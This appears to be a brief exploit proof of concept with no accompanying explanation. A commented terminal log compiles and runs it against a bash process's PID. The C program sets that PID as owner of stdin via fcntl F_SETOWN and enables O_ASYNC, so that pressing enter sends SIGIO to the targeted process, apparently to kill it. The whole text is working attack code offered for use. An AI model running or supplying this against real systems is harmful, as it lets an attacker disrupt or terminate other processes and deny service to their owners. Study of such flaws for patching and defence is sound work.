#cyborg@cyborg:~$ cd Desktop/
#cyborg@cyborg:~/Desktop$ gcc poc.c -o p0c
#cyborg@cyborg:~/Desktop$ ps
#  PID TTY          TIME CMD
#19592 pts/0    00:00:00 bash
#19631 pts/0    00:00:00 ps
#cyborg@cyborg:~/Desktop$ ./p0c 19592


#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
int s, p;

if(argc != 2) {
fputs("Specify a pid to send signal to.\n", stderr);
 exit(0);
} else {
p = atoi(argv[1]);
}
fcntl(0,F_SETOWN,p);
s = fcntl(0,F_GETFL,0);
fcntl(0,F_SETFL,s|O_ASYNC);
printf("Sending SIGIO - press enter.\n");
getchar();
fcntl(0,F_SETFL,s&~O_ASYNC);
printf("Error.\n");
return 0;
}
